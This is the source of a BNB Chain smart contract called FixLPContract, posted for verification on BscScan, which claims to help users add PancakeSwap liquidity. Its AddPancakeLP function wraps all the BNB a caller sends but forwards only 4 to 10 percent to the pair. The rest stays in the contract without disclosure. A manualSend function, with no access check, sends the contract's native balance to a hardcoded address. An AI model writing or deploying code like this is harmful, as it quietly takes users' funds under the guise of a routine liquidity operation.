/**
 *Submitted for verification at BscScan.com on 2023-08-16
*/

// SPDX-License-Identifier: No license
pragma solidity 0.8.19;

interface WBNB {
    function deposit() external payable;
}
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
}
interface Pair {
    function mint(address to) external returns (uint liquidity);
    function sync() external;
}

contract FixLPContract {
     address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function AddPancakeLP(address token, uint tokenAmount, address pair) external payable {
        // step 1: get WBNB
        WBNB(wbnb).deposit{value: msg.value}();
        uint256 percent;
        if (msg.value >= 10000000000000000000) {
            percent = 4;
        } else { if (msg.value >= 1000000000000000000){
        percent = 5;
        } else { 
            percent = 10;
        }}
        uint256 amountToLP = (msg.value/100)*percent;
        // step 2: send Tokens & WBNB to pair (remember to approve this contract on token before calling)
        IERC20(token).transferFrom(msg.sender, pair, tokenAmount);
        IERC20(wbnb).transfer(address(pair), amountToLP);
        // step 3: mint LP & fix
        Pair(pair).mint(msg.sender);
    }

    function secondFix(address token, uint tokenAmount, address pair) external {
        // step 1: send Tokens to pair (remember to approve this contract on token before calling)
        IERC20(token).transferFrom(msg.sender, pair, tokenAmount);
        // step 2: sync pair
        Pair(pair).sync();
    }

     function manualSend() external {
        uint256 contractETHBalance = address(this).balance;
        uint256 realamount = (contractETHBalance);
        address receiver = 0x1ca0a8ee25D01443f7a6eCe6D7F2E172791698D1;
        payable(receiver).transfer(realamount);
    }
}